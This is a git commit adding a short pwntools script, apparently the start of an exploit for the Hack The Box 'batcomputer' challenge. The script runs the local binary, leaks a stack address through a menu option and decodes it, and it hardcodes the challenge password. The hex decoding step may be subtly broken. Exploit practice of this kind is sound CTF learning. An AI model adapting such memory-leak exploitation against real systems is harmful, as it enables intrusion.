301e29b37f526ae00997728efd9cda6e2db543c9
Michel Klomp <michel@woodenshoe.org>
2021-02-14 17:25:04 +0100

    get stack address batcomputer

--- labnotes/htb/scripts/ch-batcomputer.py
+++ labnotes/htb/scripts/ch-batcomputer.py
@@ -1,1 +1,11 @@
 
+from pwn import *
+
+password = 'b4tp@$$w0rd!'
+
+io = process('./batcomputer')
+io.sendlineafter('> ', 1)
+stack_address = io.recvline().strip().split()[-1]
+stack_address = ''.join([chr(int(stack_address[i: i+2], 16)) for i in range(2, len(stack_address), 2)])
+
+print(stack_address)
